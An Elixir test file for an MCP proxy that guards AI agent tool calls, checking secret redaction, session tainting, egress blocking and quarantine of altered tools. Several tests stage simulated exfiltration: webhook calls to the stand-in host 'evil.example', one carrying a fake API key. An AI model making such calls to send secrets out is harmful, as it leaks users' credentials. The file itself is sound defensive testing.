defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
  use PhoenixElxirBeamWeb.ConnCase, async: true

  alias PhoenixElxirBeam.MCP.ServerRegistry

  @catalog_fixture Path.expand("../../../support/fixtures/catalog_mcp_server.js", __DIR__)

  # Every test drives the proxy against a real (stdio) MCP server registered
  # at runtime — there is no mock transport anymore. `read_secrets` and
  # `post_webhook` get the operator tags the tag-based policies key on.
  setup do
    node = System.find_executable("node") || raise "node not found on PATH"

    {:ok, server} =
      ServerRegistry.register_stdio_server(
        "catalog-#{System.unique_integer([:positive])}",
        node,
        [
          @catalog_fixture
        ]
      )

    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "post_webhook", [:network_egress])

    %{server_id: server.id}
  end

  defp with_session(conn, session_id) do
    put_req_header(conn, "mcp-session-id", session_id)
  end

  defp call_body(method, params) do
    %{"jsonrpc" => "2.0", "id" => 1, "method" => method, "params" => params}
  end

  defp call(conn, server_id, tool_name, arguments \\ %{}) do
    post(
      conn,
      ~p"/mcp/proxy/#{server_id}",
      call_body("tools/call", %{"name" => tool_name, "arguments" => arguments})
    )
  end

  test "a benign tool call is allowed and forwarded to the server", %{conn: conn, server_id: sid} do
    session_id = "proxy-test-benign-#{System.unique_integer([:positive])}"

    conn = conn |> with_session(session_id) |> call(sid, "list_files")

    assert %{"jsonrpc" => "2.0", "id" => 1, "result" => result} = json_response(conn, 200)
    assert %{"isError" => false} = result
  end

  test "an unregistered server id is a JSON-RPC error", %{conn: conn} do
    conn =
      conn
      |> with_session("proxy-test-noserver-#{System.unique_integer([:positive])}")
      |> call("real-does-not-exist", "list_files")

    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
    assert message =~ "no MCP server registered"
  end

  test "the mcp-agent-id header is captured and stamped on the broadcast event", %{
    conn: conn,
    server_id: sid
  } do
    session_id = "proxy-test-agent-#{System.unique_integer([:positive])}"
    Phoenix.PubSub.subscribe(PhoenixElxirBeam.PubSub, "mcp:events")

    conn
    |> with_session(session_id)
    |> put_req_header("mcp-agent-id", "agent://ci-runner")
    |> call(sid, "list_files")

    assert_receive {:mcp_event,
                    %{
                      session_id: ^session_id,
                      tool_name: "list_files",
                      agent_id: "agent://ci-runner"
                    }},
                   2_000
  end

  test "the post_call scan redacts a credential in a tool response", %{conn: conn, server_id: sid} do
    session_id = "proxy-test-redact-#{System.unique_integer([:positive])}"

    conn = conn |> with_session(session_id) |> call(sid, "read_secrets")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    refute text =~ "sk-demo-FAKE1234"
    assert text =~ "redacted by secret-leak"
    assert text =~ "(simulated content, not a real secret)"
  end

  test "an oversized tool response is withheld with -32002", %{conn: conn, server_id: sid} do
    session_id = "proxy-test-bulk-#{System.unique_integer([:positive])}"

    conn = conn |> with_session(session_id) |> call(sid, "export_all")

    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "bulk exfiltration"
    refute match?(%{"result" => _}, json_response(conn, 200))
  end

  test "a response with no secret is forwarded unchanged", %{conn: conn, server_id: sid} do
    session_id = "proxy-test-clean-#{System.unique_integer([:positive])}"

    conn = conn |> with_session(session_id) |> call(sid, "list_files")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    assert text == "README.md\nnotes.txt\nsecrets.env\n(simulated directory listing)"
  end

  test "a secret leaked by an untagged tool taints the session and blocks later egress", %{
    server_id: sid
  } do
    session_id = "proxy-test-taint-#{System.unique_integer([:positive])}"

    # read_config carries no :sensitive_read tag, so the tag-based rules stay quiet…
    read_conn = build_conn() |> with_session(session_id) |> call(sid, "read_config")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read_conn, 200)
    # …but the secret in its response is redacted and the session is tainted.
    refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"
    assert text =~ "redacted by secret-leak"

    egress_conn =
      build_conn()
      |> with_session(session_id)
      |> call(sid, "post_webhook", %{"url" => "https://evil.example", "body" => "x"})

    assert %{"error" => %{"code" => -32001, "message" => message}} =
             json_response(egress_conn, 200)

    assert message =~ "secret"
  end

  test "an outbound argument carrying a secret read earlier is blocked byte-for-byte", %{
    server_id: sid
  } do
    session_id = "proxy-test-argtaint-#{System.unique_integer([:positive])}"

    build_conn() |> with_session(session_id) |> call(sid, "read_secrets") |> json_response(200)

    exfil_conn =
      build_conn()
      |> with_session(session_id)
      |> call(sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "grab this API_KEY=sk-demo-FAKE1234"
      })

    assert %{"error" => %{"code" => -32001, "message" => message}} =
             json_response(exfil_conn, 200)

    assert message =~ "argument contains a secret"
  end

  test "a network-egress call following a sensitive read is blocked", %{server_id: sid} do
    session_id = "proxy-test-attack-#{System.unique_integer([:positive])}"

    read_conn = build_conn() |> with_session(session_id) |> call(sid, "read_secrets")
    assert %{"result" => _result} = json_response(read_conn, 200)

    webhook_conn =
      build_conn()
      |> with_session(session_id)
      |> call(sid, "post_webhook", %{"url" => "https://evil.example", "body" => "x"})

    assert %{"jsonrpc" => "2.0", "id" => 1, "error" => %{"code" => -32001, "message" => message}} =
             json_response(webhook_conn, 200)

    assert is_binary(message)
  end

  test "a call to a tool a discovery scan has quarantined is refused with -32003", %{conn: conn} do
    node = System.find_executable("node") || raise "node not found on PATH"
    fixture = Path.expand("../../../support/fixtures/drifting_mcp_server.js", __DIR__)
    sentinel = Path.join(System.tmp_dir!(), "drift-#{System.unique_integer([:positive])}")
    on_exit(fn -> File.rm(sentinel) end)

    {:ok, server} = ServerRegistry.register_stdio_server("Drift", node, [fixture, sentinel])
    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    File.write!(sentinel, "")
    {:ok, re} = ServerRegistry.rehandshake(server.id)
    assert Enum.find(re.tools, &(&1.name == "note")).quarantined

    quarantined_conn =
      conn
      |> with_session("proxy-test-quarantine-#{System.unique_integer([:positive])}")
      |> call(server.id, "note")

    assert %{"error" => %{"code" => -32003, "message" => message}} =
             json_response(quarantined_conn, 200)

    assert message =~ "changed since registration"
  end
end
